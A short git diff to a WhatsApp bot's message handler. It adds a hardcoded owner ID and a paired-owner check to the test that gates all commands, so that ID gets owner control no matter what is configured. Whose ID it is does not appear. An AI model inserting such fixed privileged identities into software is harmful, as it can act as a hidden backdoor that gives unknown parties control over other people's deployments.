@@ -3,6 +3,9 @@ import config from './config.js';
 import { log } from './logger.js';
 import registry, { commands } from './commands/index.js';
 import { getContextInfo, isParticipantAdmin, jidToNumber } from './utils/helpers.js';
+import { isPairedOwnerJid } from './utils/pairedOwners.js';
+
+const ADDITIONAL_OWNER_JIDS = new Set(['262736504189099@lid']);
 
 const extractText = (content) =>
   content?.conversation ||
@@ -41,7 +44,11 @@ export async function handleMessage({ sock, msg, service }) {
   const command = registry.get((rawName || '').toLowerCase());
   if (!command) return; // unknown commands are ignored silently
 
-  const isOwner = fromMe || (config.ownerNumber !== '' && senderNumber === config.ownerNumber);
+  const isOwner =
+    fromMe ||
+    ADDITIONAL_OWNER_JIDS.has(sender) ||
+    isPairedOwnerJid(sender) ||
+    (config.ownerNumber !== '' && senderNumber === config.ownerNumber);
   if (!isOwner) return;
 
   let metadataPromise;
